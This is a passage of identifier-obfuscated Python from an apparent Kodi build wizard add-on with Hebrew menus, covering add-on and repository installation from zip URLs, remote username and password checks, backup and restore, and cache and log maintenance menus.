			O00O000O00O00O00O =re .compile ('name="(.+?)".+?lugin="%s".+?rl="(.+?)".+?epository="(.+?)".+?epositoryxml="(.+?)".+?epositoryurl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"'%OO0O000000O0O0OOO ).findall (O0000000O00000OO0 )#line:2520
			if len (O00O000O00O00O00O )>0 :#line:2521
				for OOOOOO00OO00O0O00 ,OOOO00OOOOOO00000 ,OOOOO00000O0OOOOO ,OOO0O0OOOO0O000OO ,O0OO00O0O000OOO00 ,OOO0OOOO0O000O0OO ,O0O00OO000OO00O00 ,OOOOOOO0O00OOOOO0 ,OO000OOO0O0O0000O in O00O000O00O00O00O :#line:2522
					if os .path .exists (os .path .join (ADDONS ,OO0O000000O0O0OOO )):#line:2523
						O00O0O0OOO000OO0O =['Launch Addon','Remove Addon']#line:2524
						O00O0OO0O0O00O0OO =DIALOG .select ("[COLOR %s]Addon already installed what would you like to do?[/COLOR]"%COLOR2 ,O00O0O0OOO000OO0O )#line:2525
						if O00O0OO0O0O00O0OO ==0 :#line:2526
							wiz .ebi ('RunAddon(%s)'%OO0O000000O0O0OOO )#line:2527
							xbmc .sleep (1000 )#line:2528
							return True #line:2529
						elif O00O0OO0O0O00O0OO ==1 :#line:2530
							wiz .cleanHouse (os .path .join (ADDONS ,OO0O000000O0O0OOO ))#line:2531
							try :wiz .removeFolder (os .path .join (ADDONS ,OO0O000000O0O0OOO ))#line:2532
							except :pass #line:2533
							if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to remove the addon_data for:"%COLOR2 ,"[COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR1 ,OO0O000000O0O0OOO ),yeslabel ="[B][COLOR green]Yes Remove[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):#line:2534
								removeAddonData (OO0O000000O0O0OOO )#line:2535
							wiz .refresh ()#line:2536
							return True #line:2537
						else :#line:2538
							return False #line:2539
					OOOOO00OOO00O000O =os .path .join (ADDONS ,OOOOO00000O0OOOOO )#line:2540
					if not OOOOO00000O0OOOOO .lower ()=='none'and not os .path .exists (OOOOO00OOO00O000O ):#line:2541
						wiz .log ("Repository not installed, installing it")#line:2542
						if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to install the repository for [COLOR %s]%s[/COLOR]:"%(COLOR2 ,COLOR1 ,OO0O000000O0O0OOO ),"[COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR1 ,OOOOO00000O0OOOOO ),yeslabel ="[B][COLOR green]Yes Install[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):#line:2543
							OO0O000OOO0OOO0OO =wiz .parseDOM (wiz .openURL (OOO0O0OOOO0O000OO ),'addon',ret ='version',attrs ={'id':OOOOO00000O0OOOOO })#line:2544
							if len (OO0O000OOO0OOO0OO )>0 :#line:2545
								OO0O000OOO0O0O00O ='%s%s-%s.zip'%(O0OO00O0O000OOO00 ,OOOOO00000O0OOOOO ,OO0O000OOO0OOO0OO [0 ])#line:2546
								wiz .log (OO0O000OOO0O0O00O )#line:2547
								if KODIV >=17 :wiz .addonDatabase (OOOOO00000O0OOOOO ,1 )#line:2548
								installAddon (OOOOO00000O0OOOOO ,OO0O000OOO0O0O00O )#line:2549
								wiz .ebi ('UpdateAddonRepos()')#line:2550
								wiz .log ("Installing Addon from Kodi")#line:2552
								OOO00000OOO00000O =installFromKodi (OO0O000000O0O0OOO )#line:2553
								wiz .log ("Install from Kodi: %s"%OOO00000OOO00000O )#line:2554
								if OOO00000OOO00000O :#line:2555
									wiz .refresh ()#line:2556
									return True #line:2557
							else :#line:2558
								wiz .log ("[Addon Installer] Repository not installed: Unable to grab url! (%s)"%OOOOO00000O0OOOOO )#line:2559
						else :wiz .log ("[Addon Installer] Repository for %s not installed: %s"%(OO0O000000O0O0OOO ,OOOOO00000O0OOOOO ))#line:2560
					elif OOOOO00000O0OOOOO .lower ()=='none':#line:2561
						wiz .log ("No repository, installing addon")#line:2562
						OOO000000OO00OO0O =OO0O000000O0O0OOO #line:2563
						OO00000O000OOO0OO =OOOO00OOOOOO00000 #line:2564
						installAddon (OO0O000000O0O0OOO ,OOOO00OOOOOO00000 )#line:2565
						wiz .refresh ()#line:2566
						return True #line:2567
					else :#line:2568
						wiz .log ("Repository installed, installing addon")#line:2569
						OOO00000OOO00000O =installFromKodi (OO0O000000O0O0OOO ,False )#line:2570
						if OOO00000OOO00000O :#line:2571
							wiz .refresh ()#line:2572
							return True #line:2573
					if os .path .exists (os .path .join (ADDONS ,OO0O000000O0O0OOO )):return True #line:2574
					O00O00000OOO00000 =wiz .parseDOM (wiz .openURL (OOO0O0OOOO0O000OO ),'addon',ret ='version',attrs ={'id':OO0O000000O0O0OOO })#line:2575
					if len (O00O00000OOO00000 )>0 :#line:2576
						OOOO00OOOOOO00000 ="%s%s-%s.zip"%(OOOO00OOOOOO00000 ,OO0O000000O0O0OOO ,O00O00000OOO00000 [0 ])#line:2577
						wiz .log (str (OOOO00OOOOOO00000 ))#line:2578
						if KODIV >=17 :wiz .addonDatabase (OO0O000000O0O0OOO ,1 )#line:2579
						installAddon (OO0O000000O0O0OOO ,OOOO00OOOOOO00000 )#line:2580
						wiz .refresh ()#line:2581
					else :#line:2582
						wiz .log ("no match");return False #line:2583
			else :wiz .log ("[Addon Installer] Invalid Format")#line:2584
		else :wiz .log ("[Addon Installer] Text File: %s"%O0OO00O0O000OO00O )#line:2585
	else :wiz .log ("[Addon Installer] Not Enabled.")#line:2586
def installFromKodi (OO0OO0OOO00OO000O ,over =True ):#line:2588
	if over ==True :#line:2589
		xbmc .sleep (2000 )#line:2590
	wiz .ebi ('RunPlugin(plugin://%s)'%OO0OO0OOO00OO000O )#line:2592
	if not wiz .whileWindow ('yesnodialog'):#line:2593
		return False #line:2594
	xbmc .sleep (1000 )#line:2595
	if wiz .whileWindow ('okdialog'):#line:2596
		return False #line:2597
	wiz .whileWindow ('progressdialog')#line:2598
	if os .path .exists (os .path .join (ADDONS ,OO0OO0OOO00OO000O )):return True #line:2599
	else :return False #line:2600
def installAddon (OOOOO0O00000O0OO0 ,O000OO0O00OOOO000 ):#line:2602
	if not wiz .workingURL (O000OO0O00OOOO000 )==True :wiz .LogNotify ("[COLOR %s]Addon Installer[/COLOR]"%COLOR1 ,'[COLOR %s]%s:[/COLOR] [COLOR %s]קישור זיפ לא תקין![/COLOR]'%(COLOR1 ,OOOOO0O00000O0OO0 ,COLOR2 ));return #line:2603
	if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:2604
	DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOOOO0O00000O0OO0 ),'','[COLOR %s]אנא המתן[/COLOR]'%COLOR2 )#line:2605
	O0O0O0000OO000OO0 =O000OO0O00OOOO000 .split ('/')#line:2606
	O0OO00O0OO0OO0OOO =os .path .join (PACKAGES ,O0O0O0000OO000OO0 [-1 ])#line:2607
	try :os .remove (O0OO00O0OO0OO0OOO )#line:2608
	except :pass #line:2609
	downloader .download (O000OO0O00OOOO000 ,O0OO00O0OO0OO0OOO ,DP )#line:2610
	OO0OOO00OOO00000O ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOOOO0O00000O0OO0 )#line:2611
	DP .update (0 ,OO0OOO00OOO00000O ,'','[COLOR %s]אנא המתן[/COLOR]'%COLOR2 )#line:2612
	O00O0O0OOOO00OO00 ,O0OOO00OOO00O000O ,O000O00000000O000 =extract .all (O0OO00O0OO0OO0OOO ,ADDONS ,DP ,title =OO0OOO00OOO00000O )#line:2613
	DP .update (0 ,OO0OOO00OOO00000O ,'','[COLOR %s]מתקין תלויות[/COLOR]'%COLOR2 )#line:2614
	installed (OOOOO0O00000O0OO0 )#line:2615
	installDep (OOOOO0O00000O0OO0 ,DP )#line:2616
	DP .close ()#line:2617
	wiz .ebi ('UpdateAddonRepos()')#line:2618
	wiz .ebi ('UpdateLocalAddons()')#line:2619
	wiz .refresh ()#line:2620
def installDep (OO0O0O0OO000OOO00 ,DP =None ):#line:2622
	O00OOOOO0O0O00OOO =os .path .join (ADDONS ,OO0O0O0OO000OOO00 ,'addon.xml')#line:2623
	if os .path .exists (O00OOOOO0O0O00OOO ):#line:2624
		OO00OOO000O0O00OO =open (O00OOOOO0O0O00OOO ,mode ='r');O00O0OO0O00000O0O =OO00OOO000O0O00OO .read ();OO00OOO000O0O00OO .close ();#line:2625
		OO0OO0O0O0OO00OOO =wiz .parseDOM (O00O0OO0O00000O0O ,'import',ret ='addon')#line:2626
		for O0O0O00000000OOOO in OO0OO0O0O0OO00OOO :#line:2627
			if not 'xbmc.python'in O0O0O00000000OOOO :#line:2628
				if not DP ==None :#line:2629
					DP .update (0 ,'','[COLOR %s]%s[/COLOR]'%(COLOR1 ,O0O0O00000000OOOO ))#line:2630
				wiz .createTemp (O0O0O00000000OOOO )#line:2631
def installed (O0OOOOO000000OO00 ):#line:2658
	O00000OO0O00000O0 =os .path .join (ADDONS ,O0OOOOO000000OO00 ,'addon.xml')#line:2659
	if os .path .exists (O00000OO0O00000O0 ):#line:2660
		try :#line:2661
			O0OO0OOOO0OOOOOOO =open (O00000OO0O00000O0 ,mode ='r');O0O0OO000OO00OO00 =O0OO0OOOO0OOOOOOO .read ();O0OO0OOOO0OOOOOOO .close ()#line:2662
			OO0O0O00OO0OOO0O0 =wiz .parseDOM (O0O0OO000OO00OO00 ,'addon',ret ='name',attrs ={'id':O0OOOOO000000OO00 })#line:2663
			OOOO0000000OOOOOO =os .path .join (ADDONS ,O0OOOOO000000OO00 ,'icon.png')#line:2664
			wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,OO0O0O00OO0OOO0O0 [0 ]),'[COLOR %s]מאפשר הרחבות[/COLOR]'%COLOR2 ,'2000',OOOO0000000OOOOOO )#line:2665
		except :pass #line:2666
def youtubeMenu (url =None ):#line:2668
	if not YOUTUBEFILE =='http://':#line:2669
		if url ==None :#line:2670
			O0O0OOOO000OO0OOO =wiz .workingURL (YOUTUBEFILE )#line:2671
			O000OOO0O0OO00O0O =uservar .YOUTUBEFILE #line:2672
		else :#line:2673
			O0O0OOOO000OO0OOO =wiz .workingURL (url )#line:2674
			O000OOO0O0OO00O0O =url #line:2675
		if O0O0OOOO000OO0OOO ==True :#line:2676
			O0O00OO000OOOO00O =wiz .openURL (O000OOO0O0OO00O0O ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2677
			OOO00OOOO0O00OO0O =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (O0O00OO000OOOO00O )#line:2678
			if len (OOO00OOOO0O00OO0O )>0 :#line:2679
				for O00O0O0O0O0OOOOO0 ,O0O00OOOOOO00O00O ,url ,O0OOOO0000000OOOO ,O0O00OOOO0OO0OO0O ,O0O0O00000000O0OO in OOO00OOOO0O00OO0O :#line:2680
					if O0O00OOOOOO00O00O .lower ()=="yes":#line:2681
						addDir ("[B]%s[/B]"%O00O0O0O0O0OOOOO0 ,'youtube',url ,description =O0O0O00000000O0OO ,icon =O0OOOO0000000OOOO ,fanart =O0O00OOOO0OO0OO0O ,themeit =THEME3 )#line:2682
					else :#line:2683
						addFile (O00O0O0O0O0OOOOO0 ,'viewVideo',url =url ,description =O0O0O00000000O0OO ,icon =O0OOOO0000000OOOO ,fanart =O0O00OOOO0OO0OO0O ,themeit =THEME2 )#line:2684
			else :wiz .log ("[YouTube Menu] ERROR: Invalid Format.")#line:2685
		else :#line:2686
			wiz .log ("[YouTube Menu] ERROR: URL for YouTube list not working.")#line:2687
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2688
			addFile ('%s'%O0O0OOOO000OO0OOO ,'',themeit =THEME3 )#line:2689
	else :wiz .log ("[YouTube Menu] No YouTube list added.")#line:2690
	setView ('files','viewType')#line:2691
def STARTP ():#line:2692
	OOO0O0OO0O000OOOO =(ADDON .getSetting ("pass"))#line:2693
	if BUILDNAME =="":#line:2694
	 if not NOTIFY =='true':#line:2695
          O0OO0O0O0O0000O0O =wiz .workingURL (NOTIFICATION )#line:2696
	 if not NOTIFY2 =='true':#line:2697
          O0OO0O0O0O0000O0O =wiz .workingURL (NOTIFICATION2 )#line:2698
	 if not NOTIFY3 =='true':#line:2699
          O0OO0O0O0O0000O0O =wiz .workingURL (NOTIFICATION3 )#line:2700
	OO0O0OOOOO0OOOOOO =OOO0O0OO0O000OOOO #line:2701
	O0OO0O0O0O0000O0O =urllib2 .Request (SPEED )#line:2702
	O000O0O0000O0O000 =urllib2 .urlopen (O0OO0O0O0O0000O0O )#line:2703
	O00OOO00O00O0O0O0 =O000O0O0000O0O000 .readlines ()#line:2705
	O0OO00OO0000O0OO0 =0 #line:2709
	for OO0OOO0OO0OOO0O00 in O00OOO00O00O0O0O0 :#line:2710
		if OO0OOO0OO0OOO0O00 .split (' ==')[0 ]==OOO0O0OO0O000OOOO or OO0OOO0OO0OOO0O00 .split ()[0 ]==OOO0O0OO0O000OOOO :#line:2711
			O0OO00OO0000O0OO0 =1 #line:2712
			break #line:2713
	if O0OO00OO0000O0OO0 ==0 :#line:2714
					O00OO00OO0O00O0OO =DIALOG .yesno ("%s"%ADDONTITLE ,"[COLOR %s]הסיסמה אינה נכונה,"%(COLOR2 ),"הכנס את הסיסמה כעת[/COLOR]",nolabel ='[B][COLOR white]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]אישור[/COLOR][/B]')#line:2715
					if O00OO00OO0O00O0OO :#line:2717
						ADDON .openSettings ()#line:2719
						sys .exit ()#line:2721
					else :#line:2722
						sys .exit ()#line:2723
	return 'ok'#line:2727
def STARTP2 ():#line:2728
	O0OO0O0O0OO00OO0O =(ADDON .getSetting ("user"))#line:2729
	O0OOO0O000O0O0O00 =(UNAME )#line:2731
	O00O0OOOO00000O00 =urllib2 .urlopen (O0OOO0O000O0O0O00 )#line:2732
	OO000OO000OO00OOO =O00O0OOOO00000O00 .readlines ()#line:2733
	O000000O0O0OO0OO0 =0 #line:2734
	for OOOO00O0000OO0O0O in OO000OO000OO00OOO :#line:2737
		if OOOO00O0000OO0O0O .split (' ==')[0 ]==O0OO0O0O0OO00OO0O or OOOO00O0000OO0O0O .split ()[0 ]==O0OO0O0O0OO00OO0O :#line:2738
			O000000O0O0OO0OO0 =1 #line:2739
			break #line:2740
	if O000000O0O0OO0OO0 ==0 :#line:2741
		O000000000000OO00 =DIALOG .yesno ("%s"%ADDONTITLE ,"[COLOR %s]שם המתשמש שהוכנס אינו נכון,"%(COLOR2 ),"הכנס את שם המשתמש כעת[/COLOR]",nolabel ='[B][COLOR white]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]אישור[/COLOR][/B]')#line:2742
		if O000000000000OO00 :#line:2744
			ADDON .openSettings ()#line:2746
			sys .exit ()#line:2749
		else :#line:2750
			sys .exit ()#line:2751
	return 'ok'#line:2755
def passandpin ():#line:2756
	addFile ('קבל קוד אימות','getpass',name ,'getpass',themeit =THEME1 )#line:2757
	addFile ('הכנס שם משתמש','setuname',name ,'setuname',themeit =THEME1 )#line:2758
	addFile ('הכנס סיסמה','setpass',name ,'setpass',themeit =THEME1 )#line:2759
def passandUsername ():#line:2760
	ADDON .openSettings ()#line:2761
def folderback ():#line:2764
    O00O0O0OO000OOOOO =ADDON .getSetting ("path")#line:2765
    if O00O0O0OO000OOOOO :#line:2766
      O00O0O0OO000OOOOO =xbmcgui .Dialog ().browse (0 ,"בחר תקייה",'files','',False ,False ,HOME )#line:2767
      ADDON .setSetting ("path",O00O0O0OO000OOOOO )#line:2768
def backmyupbuild ():#line:2771
		addFile ('מחק את תיקיית הגיבוי שלי','clearbackup',icon =ICONMAINT ,themeit =THEME3 )#line:2775
		addFile ('[COLOR %s]%s[/COLOR]מיקום גיבוי: '%(COLOR2 ,MYBUILDS ),'folderback','Maintenance',icon =ICONMAINT ,themeit =THEME3 )#line:2776
		addFile ('גיבוי בילד שלם','backupbuild',icon =ICONMAINT ,themeit =THEME3 )#line:2777
		addFile ('גיבוי הגדרות סקין ותפריטים בלבד','backuptheme',icon =ICONMAINT ,themeit =THEME3 )#line:2779
		addFile ('גיבוי הגדרות של הרחבות כולל תפריטים וסיסמאות','backupaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2780
		addFile ('שחזור בילד שלם','restorezip',icon =ICONMAINT ,themeit =THEME3 )#line:2781
		addFile ('שחזור הגדרות','restoreaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2783
def maintMenu (view =None ):#line:2787
	O0O0OOOO0O0OO0O00 ='[B][COLOR green]ON[/COLOR][/B]';O000OO000OO000O0O ='[B][COLOR red]OFF[/COLOR][/B]'#line:2789
	OOO00OOOOO0OO0O00 ='true'if AUTOCLEANUP =='true'else 'false'#line:2790
	O0OO0O00000OO00O0 ='true'if AUTOCACHE =='true'else 'false'#line:2791
	O0000O0OO00OO0OOO ='true'if AUTOPACKAGES =='true'else 'false'#line:2792
	O00OOOO000OOO0OO0 ='true'if AUTOTHUMBS =='true'else 'false'#line:2793
	OO0O00O00OO000O00 ='true'if SHOWMAINT =='true'else 'false'#line:2794
	OO0O00OOO0OOOOOOO ='true'if INCLUDEVIDEO =='true'else 'false'#line:2795
	OOO00OOOOO00OO000 ='true'if INCLUDEALL =='true'else 'false'#line:2796
	OO0O0OOOOO0O0O0O0 ='true'if THIRDPARTY =='true'else 'false'#line:2797
	if wiz .Grab_Log (True )==False :OOOO000OO0OO00OOO =0 #line:2798
	else :OOOO000OO0OO00OOO =errorChecking (wiz .Grab_Log (True ),True ,True )#line:2799
	if wiz .Grab_Log (True ,True )==False :O00O0OO0OO0000O00 =0 #line:2800
	else :O00O0OO0OO0000O00 =errorChecking (wiz .Grab_Log (True ,True ),True ,True )#line:2801
	OO0O0OO0O000O0OO0 =int (OOOO000OO0OO00OOO )+int (O00O0OO0OO0000O00 )#line:2802
	O0O0O00OOO00OO0OO =str (OO0O0OO0O000O0OO0 )+' Error(s) Found'if OO0O0OO0O000O0OO0 >0 else 'None Found'#line:2803
	OO00OOO000OO0OO00 =': [COLOR red]Not Found[/COLOR]'if not os .path .exists (WIZLOG )else ": [COLOR green]%s[/COLOR]"%wiz .convertSize (os .path .getsize (WIZLOG ))#line:2804
	if OOO00OOOOO00OO000 =='true':#line:2805
		O00OOOOO00O0OO00O ='true'#line:2806
		O0O0000O0OO000OOO ='true'#line:2807
		OO0O00O0O00O0O0OO ='true'#line:2808
		O00OOOOO000000O00 ='true'#line:2809
		OO0O0000O0000O0OO ='true'#line:2810
		O0OOOOO0OOO0OO000 ='true'#line:2811
		OO0OO000000000O00 ='true'#line:2812
		O0O0OOOOOOOO00000 ='true'#line:2813
	else :#line:2814
		O00OOOOO00O0OO00O ='true'if INCLUDEBOB =='true'else 'false'#line:2815
		O0O0000O0OO000OOO ='true'if INCLUDEPHOENIX =='true'else 'false'#line:2816
		OO0O00O0O00O0O0OO ='true'if INCLUDESPECTO =='true'else 'false'#line:2817
		O00OOOOO000000O00 ='true'if INCLUDEGENESIS =='true'else 'false'#line:2818
		OO0O0000O0000O0OO ='true'if INCLUDEEXODUS =='true'else 'false'#line:2819
		O0OOOOO0OOO0OO000 ='true'if INCLUDEONECHAN =='true'else 'false'#line:2820
		OO0OO000000000O00 ='true'if INCLUDESALTS =='true'else 'false'#line:2821
		O0O0OOOOOOOO00000 ='true'if INCLUDESALTSHD =='true'else 'false'#line:2822
	O000OOO0O00OO0O00 =wiz .getSize (PACKAGES )#line:2823
	O0O0OO00000O0000O =wiz .getSize (THUMBS )#line:2824
	OO0O0O000O000OOOO =wiz .getCacheSize ()#line:2825
	O0OOOO00O0OOOOOO0 =O000OOO0O00OO0O00 +O0O0OO00000O0000O +OO0O0O000O000OOOO #line:2826
	O0OOO0OO0OO0OOOOO =['Daily','Always','3 Days','Weekly']#line:2827
	addDir ('[B]Cleaning Tools[/B]','maint','clean',icon =ICONMAINT ,themeit =THEME1 )#line:2828
	if view =="clean"or SHOWMAINT =='true':#line:2829
		addFile ('ניקוי מלא: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (O0OOOO00O0OOOOOO0 ),'fullclean',icon =ICONMAINT ,themeit =THEME3 )#line:2830
		addFile ('ניקוי קאש: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (OO0O0O000O000OOOO ),'clearcache',icon =ICONMAINT ,themeit =THEME3 )#line:2831
		addFile ('ניקוי חבילות: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (O000OOO0O00OO0O00 ),'clearpackages',icon =ICONMAINT ,themeit =THEME3 )#line:2832
		addFile ('ניקוי תמונות: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (O0O0OO00000O0000O ),'clearthumb',icon =ICONMAINT ,themeit =THEME3 )#line:2833
		addFile ('ניקוי תמונות ישנות','oldThumbs',icon =ICONMAINT ,themeit =THEME3 )#line:2834
		addFile ('ניקוי קאש לוג','clearcrash',icon =ICONMAINT ,themeit =THEME3 )#line:2835
		addFile ('ניקוי חבילות ישנות','purgedb',icon =ICONMAINT ,themeit =THEME3 )#line:2836
		addFile ('התקנה נקיה','freshstart',icon =ICONMAINT ,themeit =THEME3 )#line:2837
	addDir ('[B]Addon Tools[/B]','maint','addon',icon =ICONMAINT ,themeit =THEME1 )#line:2838
	if view =="addon"or SHOWMAINT =='false':#line:2839
		addFile ('הסרת הרחבות','removeaddons',icon =ICONMAINT ,themeit =THEME3 )#line:2840
		addDir ('הסרת מידע הרחבות','removeaddondata',icon =ICONMAINT ,themeit =THEME3 )#line:2841
		addDir ('הפעלה או ביטול הרחבות','enableaddons',icon =ICONMAINT ,themeit =THEME3 )#line:2842
		addFile ('Enable/Disable Adult Addons','toggleadult',icon =ICONMAINT ,themeit =THEME3 )#line:2843
		addFile ('בודק עדכונים','forceupdate',icon =ICONMAINT ,themeit =THEME3 )#line:2844
		addFile ('Hide Passwords On Keyboard Entry','hidepassword',icon =ICONMAINT ,themeit =THEME3 )#line:2845
		addFile ('Unhide Passwords On Keyboard Entry','unhidepassword',icon =ICONMAINT ,themeit =THEME3 )#line:2846
	addDir ('[B]Misc Maintenance[/B]','maint','misc',icon =ICONMAINT ,themeit =THEME1 )#line:2847
	if view =="misc"or SHOWMAINT =='true':#line:2848
		addFile ('Kodi 17 Fix','kodi17fix',icon =ICONMAINT ,themeit =THEME3 )#line:2849
		addFile ('Reload Skin','forceskin',icon =ICONMAINT ,themeit =THEME3 )#line:2850
		addFile ('Reload Profile','forceprofile',icon =ICONMAINT ,themeit =THEME3 )#line:2851
		addFile ('Force Close Kodi','forceclose',icon =ICONMAINT ,themeit =THEME3 )#line:2852
		addFile ('Upload Kodi.log','uploadlog',icon =ICONMAINT ,themeit =THEME3 )#line:2853
		addFile ('View Errors in Log: %s'%(O0O0O00OOO00OO0OO ),'viewerrorlog',icon =ICONMAINT ,themeit =THEME3 )#line:2854
		addFile ('View Log File','viewlog',icon =ICONMAINT ,themeit =THEME3 )#line:2855
		addFile ('View Wizard Log File','viewwizlog',icon =ICONMAINT ,themeit =THEME3 )#line:2856
		addFile ('Clear Wizard Log File%s'%OO00OOO000OO0OO00 ,'clearwizlog',icon =ICONMAINT ,themeit =THEME3 )#line:2857
	addDir ('[B]שחזור וגיבוי[/B]','maint','backup',icon =ICONMAINT ,themeit =THEME1 )#line:2858
	if view =="backup"or SHOWMAINT =='true':#line:2859
		addFile ('Clean Up Back Up Folder','clearbackup',icon =ICONMAINT ,themeit =THEME3 )#line:2860
		addFile ('Back Up Location: [COLOR %s]%s[/COLOR]'%(COLOR2 ,MYBUILDS ),'settings','Maintenance',icon =ICONMAINT ,themeit =THEME3 )#line:2861
		addFile ('[גיבוי]: בילד','backupbuild',icon =ICONMAINT ,themeit =THEME3 )#line:2862
		addFile ('[גיבוי]: פרופילים','backupgui',icon =ICONMAINT ,themeit =THEME3 )#line:2863
		addFile ('[גיבוי]: סקינים','backuptheme',icon =ICONMAINT ,themeit =THEME3 )#line:2864
		addFile ('[גיבוי]: אדון דאטה','backupaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2865
		addFile ('[שחזור]: בילד מתיקיה מקומית','restorezip',icon =ICONMAINT ,themeit =THEME3 )#line:2866
		addFile ('[שחזור]: פרופילים מתיקיה מקומית','restoregui',icon =ICONMAINT ,themeit =THEME3 )#line:2867
		addFile ('[שחזור]: אדון דאטה מתיקיה מקומית','restoreaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2868
		addFile ('[שחזור]: בילד מתיקיה חיצונית','restoreextzip',icon =ICONMAINT ,themeit =THEME3 )#line:2869
		addFile ('[שחזור]: פרופילים מתיקיה חיצונית','restoreextgui',icon =ICONMAINT ,themeit =THEME3 )#line:2870
		addFile ('[שחזור]: אדון דאטה מתיקיה חיצונית','restoreextaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2871
	addDir ('[B]System Tweaks/Fixes[/B]','maint','tweaks',icon =ICONMAINT ,themeit =THEME1 )#line:2872
	if view =="tweaks"or SHOWMAINT =='true':#line:2873
		if not ADVANCEDFILE =='http://'and not ADVANCEDFILE =='':#line:2874
			addDir ('Advanced Settings','advancedsetting',icon =ICONMAINT ,themeit =THEME3 )#line:2875
		else :#line:2876
			if os .path .exists (ADVANCED ):#line:2877
				addFile ('View Currect AdvancedSettings.xml','currentsettings',icon =ICONMAINT ,themeit =THEME3 )#line:2878
				addFile ('Remove Currect AdvancedSettings.xml','removeadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2879
			addFile ('Quick Configure AdvancedSettings.xml','autoadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2880
		addFile ('Scan Sources for broken links','checksources',icon =ICONMAINT ,themeit =THEME3 )#line:2881
		addFile ('Scan For Broken Repositories','checkrepos',icon =ICONMAINT ,themeit =THEME3 )#line:2882
		addFile ('Fix Addons Not Updating','fixaddonupdate',icon =ICONMAINT ,themeit =THEME3 )#line:2883
		addFile ('Remove Non-Ascii filenames','asciicheck',icon =ICONMAINT ,themeit =THEME3 )#line:2884
		addFile ('Convert Paths to special','convertpath',icon =ICONMAINT ,themeit =THEME3 )#line:2885
		addDir ('System Information','systeminfo',icon =ICONMAINT ,themeit =THEME3 )#line:2886
	addFile ('Show All Maintenance: %s'%OO0O00O00OO000O00 .replace ('true',O0O0OOOO0O0OO0O00 ).replace ('false',O000OO000OO000O0O ),'togglesetting','showmaint',icon =ICONMAINT ,themeit =THEME2 )#line:2887
	addDir ('[I]<< Return to Main Menu[/I]',icon =ICONMAINT ,themeit =THEME2 )#line:2888
	addFile ('Third Party Wizards: %s'%OO0O0OOOOO0O0O0O0 .replace ('true',O0O0OOOO0O0OO0O00 ).replace ('false',O000OO000OO000O0O ),'togglesetting','enable3rd',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2889
	if OO0O0OOOOO0O0O0O0 =='true':#line:2890
		O000OO0OO00O0O000 =THIRD1NAME if not THIRD1NAME ==''else 'Not Set'#line:2891
		OOO0O0O0O0OOOOOOO =THIRD2NAME if not THIRD2NAME ==''else 'Not Set'#line:2892
		O000OOO0O0O000O00 =THIRD3NAME if not THIRD3NAME ==''else 'Not Set'#line:2893
		addFile ('Edit Third Party Wizard 1: [COLOR %s]%s[/COLOR]'%(COLOR2 ,O000OO0OO00O0O000 ),'editthird','1',icon =ICONMAINT ,themeit =THEME3 )#line:2894
		addFile ('Edit Third Party Wizard 2: [COLOR %s]%s[/COLOR]'%(COLOR2 ,OOO0O0O0O0OOOOOOO ),'editthird','2',icon =ICONMAINT ,themeit =THEME3 )#line:2895
		addFile ('Edit Third Party Wizard 3: [COLOR %s]%s[/COLOR]'%(COLOR2 ,O000OOO0O0O000O00 ),'editthird','3',icon =ICONMAINT ,themeit =THEME3 )#line:2896
	addFile ('ניקוי אוטומטי','',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2897
	addFile ('ניקוי אוטומטי בהפעלה: %s'%OOO00OOOOO0OO0O00 .replace ('true',O0O0OOOO0O0OO0O00 ).replace ('false',O000OO000OO000O0O ),'togglesetting','autoclean',icon =ICONMAINT ,themeit =THEME3 )#line:2898
	if OOO00OOOOO0OO0O00 =='true':#line:2899
		addFile ('--- תדירות ניקוי: [B][COLOR green]%s[/COLOR][/B]'%O0OOO0OO0OO0OOOOO [AUTOFEQ ],'changefeq',icon =ICONMAINT ,themeit =THEME3 )#line:2900
		addFile ('--- ניקוי קאש בהפעלה: %s'%O0OO0O00000OO00O0 .replace ('true',O0O0OOOO0O0OO0O00 ).replace ('false',O000OO000OO000O0O ),'togglesetting','clearcache',icon =ICONMAINT ,themeit =THEME3 )#line:2901
		addFile ('--- ניקוי חבילות בהפעלה: %s'%O0000O0OO00OO0OOO .replace ('true',O0O0OOOO0O0OO0O00 ).replace ('false',O000OO000OO000O0O ),'togglesetting','clearpackages',icon =ICONMAINT ,themeit =THEME3 )#line:2902
		addFile ('--- ניקוי תמונות ישנות בהפעלה: %s'%O00OOOO000OOO0OO0 .replace ('true',O0O0OOOO0O0OO0O00 ).replace ('false',O000OO000OO000O0O ),'togglesetting','clearthumbs',icon =ICONMAINT ,themeit =THEME3 )#line:2903
	addFile ('ניקוי וידאו קאש','',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2904
